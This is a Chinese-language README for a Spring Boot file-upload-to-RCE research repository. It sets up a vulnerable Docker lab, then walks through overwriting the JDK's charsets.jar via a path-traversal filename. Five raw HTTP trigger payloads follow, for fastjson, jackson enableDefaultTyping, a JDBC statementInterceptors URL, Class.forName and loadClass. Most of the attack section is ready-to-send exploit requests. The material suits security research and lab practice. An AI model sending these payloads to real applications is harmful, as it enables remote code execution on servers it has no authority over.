## spring-boot-upload-file-lead-to-rce-tricks


### docker 漏洞环境搭建：

```
docker pull landgrey/spring-boot-fat-jar-write-file-rce:1.1
docker run -d -p 18081:18081 landgrey/spring-boot-fat-jar-write-file-rce:1.1
```

**访问** http://127.0.0.1:18081/ 



### 一些利用思考的文章：

[https://landgrey.me/blog/22/](https://landgrey.me/blog/22/)



### docker 漏洞环境的功能：

- 1. 文件上传功能 (默认上传到 /tmp/ 目录，可跳目录）
- 2. 列目录功能     (列出 /tmp/ 目录下文件)



### 漏洞利用条件：

- 1. 可以获得 jdk 安装的 home 目录位置
- (可收集常见 jdk 默认安装目录位置，然后使用字典枚举尝试)

- 2. jdk 自带文件 `/jre/lib/***.jar` 没被 `Opened` 过
- (以 charsets.jar 文件举例：程序代码中不使用 `Charset.forName("GBK")` 类似的调用，默认就不会加载到 charsets.jar 文件)



### 漏洞利用步骤：

1. 选择上传文件 [charsets.jar](https://raw.githubusercontent.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/master/release/charsets.jar)

2. 使用上传文件功能，上传时用 burpsuite 截住数据包，filename 修改为 `../../usr/lib/jvm/java-1.8-openjdk/jre/lib/charsets.jar`

3. 上传成功后使用数据包触发漏洞

4. 漏洞触发成功会在 /tmp/ 目录产生 charsets_test_[random-string].log 样式名字的文件

5. 最后使用列目录功能查看漏洞利用是否成功



### 漏洞利用场景：(5 个)

#### 1. fastjson 最新版(目前是 1.2.76)默认配置场景

正常数据包：

```
POST /fastjson HTTP/1.1
Content-Type: application/json

{"name":"test"}
```

触发漏洞数据包：

```
POST /fastjson HTTP/1.1
Content-Type: application/json

{
    "x":{
        "@type":"java.nio.charset.Charset",
        "val":"500"
    }
}
```



#### 2. jackson 开启 enableDefaultTyping 场景

正常数据包：

```
POST /jackson HTTP/1.1
Content-Type: application/json

["code.landgrey.bean.User",{"name":"zhangsan","age":20,"car":{"brand":"daben","price":1000000},"secret":"Pas@5w0rd"}]
```

触发漏洞数据包：

```
POST /jackson HTTP/1.1
Content-Type: application/json

["sun.nio.cs.ext.IBM33722",{"x":"y"}]
```



#### 3. jdbc url getConnection 场景

正常数据包：

```
GET /jdbc?url=jdbc:mysql://127.0.0.1:3306/test?user=root&password=123456
```

触发漏洞数据包：

```
GET /jdbc?url=jdbc:mysql://127.0.0.1:3306/test?statementInterceptors=sun.nio.cs.ext.IBM33722
```



#### 4. Class forName 场景

正常数据包：

```
GET /classForName?name=code.landgrey.bean.Car
```

触发漏洞数据包：

```
GET /classForName?name=sun.nio.cs.ext.IBM33722
```



#### 5. loadClass newInstance 场景

正常数据包：

```
GET /classLoader?name=code.landgrey.bean.User
```

触发漏洞数据包：

```
GET /classLoader?name=sun.nio.cs.ext.IBM33722
```

